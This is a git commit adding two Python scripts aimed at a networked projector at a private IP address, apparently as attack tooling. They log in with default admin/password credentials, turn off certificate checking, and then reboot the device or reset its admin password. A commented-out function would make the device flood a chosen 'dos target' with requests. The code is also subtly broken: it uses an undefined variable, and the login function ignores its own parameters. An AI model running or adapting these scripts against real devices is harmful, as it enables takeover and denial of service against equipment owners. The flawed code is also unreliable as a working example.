9845e8b266f2535265c78e249dedb890813357f9
zdowling489 <44825101+zdowling489@users.noreply.github.com>
2019-10-28 12:44:26 -0400

    Add files via upload

---
+++ AdminFunctions131.py
@@ -0,0 +1,62 @@
+#!/usr/bin/python3
+
+#---------------------------------
+# Purpose: Individual Functions
+
+# Version: 1
+#
+# October 21, 2019
+#----------------------------------
+
+import requests
+import urllib3
+
+urllib3.disable_warnings()
+
+#host is projector, username generally admin, password generally admin
+def AdminLogin(host,username,password):
+    print("Trying to login.")
+
+    url = "https://" + host + "/userlogin.html"
+
+    #POST Data
+    data = {
+        'login': 'admin',
+        'passwd': 'password'
+    }
+
+    # Send Login Request
+    login = requests.post(url=url, data=data, verify=False)
+
+    cookies = login.cookies
+
+    return cookies
+
+# host is the target, cookie is cookie from AdminLogin, loop is True or False
+def Reboot(host, cookie):
+    url = "https://" + host + "/Device/DeviceOperations"
+    data = {
+        "Reboot": "true"
+    }
+    reboot = requests.post(url=url, data=data, verify=False, cookies=cookies)
+    print("Reboot Incoming")
+
+# host is the target, cookie is cookie from AdminLogin, WebServer is dos target
+"""def WebDos(host, cookie, WebServer):
+    WebServer = "YourTargetHere"
+    url = "https://" + host + "/cgi-bin/return.cgi"
+    data = {
+        "command": "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
+    }
+    remoteViewOn = requests.post(url=url, data=data, verify=False)
+    print("Web Request Sent")"""
+
+# host is the target, cookie is cookie from AdminLogin,newPass is the pass you want to change it to
+def ChangePass(host, cookie, newPass):
+    url = "https://" + host + "/Device/Authentication/"
+    data = {
+        "Name": "admin",
+        "Password": newPass
+    }
+    changePass = requests.post(url=url, data=data, verify=False, cookies=cookies)
+    print("Password Change Request Sent")
---
+++ loginAdmin131.py
@@ -0,0 +1,58 @@
+#!/usr/bin/python3
+
+#---------------------------------
+# Admin Login 131
+#
+# Version: 1
+#
+# October 21, 2019
+#----------------------------------
+
+import requests
+import urllib3
+
+urllib3.disable_warnings()
+
+print("Trying to log in.")
+
+#Admin Credentials
+username="admin"
+password="password"
+
+#Target
+host="10.103.36.131"
+
+#URL of projector
+url="https://" + host + "/userlogin.html"
+
+#data
+data={
+    'login': 'admin',
+    'passwd': 'password'
+}
+
+#Send login request
+login = requests.post(url=url, data=data, verify=False)
+cookies = login.cookies
+
+action="ChangePass"
+if action == "Reboot":
+    #Reboot the device
+    url = "https://" + host + "/Device/DeviceOperations"
+    data = {
+        "Reboot": True
+    }
+    reboot = requests.post(url=url, data=data, verify=False, cookies=cookies)
+    print("Reboot Incoming")
+elif action == "ChangePass":
+    #Change Password of Device
+    newPass = "Asteroid01"
+    url = "https://" + host + "/Device/Authentication/"
+    data = {
+        "Name": "admin",
+        "Password": newPass
+    }
+    changePass = requests.post(url=url, data=data, verify=False, cookies=cookies)
+    print("Password change request sent.")
+
+
